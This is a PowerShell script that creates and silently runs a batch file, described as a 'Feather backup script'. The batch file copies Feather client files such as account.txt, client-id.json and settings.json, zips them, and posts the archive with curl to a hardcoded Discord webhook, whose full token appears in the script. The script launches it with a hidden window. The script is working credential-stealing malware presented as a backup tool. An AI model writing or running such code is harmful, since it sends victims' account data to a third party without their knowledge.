# Define the path for the batch file
$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$batchFilePath = Join-Path $desktopPath 'send_webhook.bat'

# Define the content of the batch file (your Feather backup script WITHOUT pause)
$batchContent = @"
@echo off
setlocal EnableDelayedExpansion

REM Paths
set "FEATHER_DIR=%USERPROFILE%\AppData\Roaming\.feather"
set "TMP_DIR=%FEATHER_DIR%\feather_backup_tmp"
set "ZIP_NAME=feather_backup.zip"
set "ZIP_PATH=%FEATHER_DIR%\%ZIP_NAME%"
set "WEBHOOK=https://discord.com/api/webhooks/1398946726496305152/Kn9ULfJCNezuBKC_3Bs0E9l77SFysZLSqMMF0K-O8wDGJUgG13l5Mk8riFWJznckKInt"

REM Create temp folder
mkdir "%TMP_DIR%" 2>nul

REM Files list
set FILES=skins.json settings.json cmp.json client-id.json app-settings.json account.txt

REM Copy existing files
for %%F in (%FILES%) do (
    if exist "%FEATHER_DIR%\%%F" (
        copy "%FEATHER_DIR%\%%F" "%TMP_DIR%\%%F" >nul
    ) else (
        echo Skipping missing file: %%F
    )
)

REM Create ZIP archive using PowerShell Compress-Archive
pushd "%FEATHER_DIR%"
powershell -Command "Compress-Archive -Path '%TMP_DIR%\*' -DestinationPath '%ZIP_PATH%' -Force"
popd

REM Remove temp folder
rmdir /S /Q "%TMP_DIR%"

echo Backup created: %ZIP_PATH%
echo Uploading to Discord...

REM Upload ZIP using curl
curl -X POST "%WEBHOOK%" -F "file=@%ZIP_PATH%" --progress-bar

echo.
echo Done.
"@

# Write the content to the batch file with ASCII encoding
Set-Content -Path $batchFilePath -Value $batchContent -Encoding ASCII

# Run the batch file hidden (no console window)
Start-Process -FilePath $batchFilePath -WindowStyle Hidden

Write-Host "Batch file created at $batchFilePath and started in hidden mode."
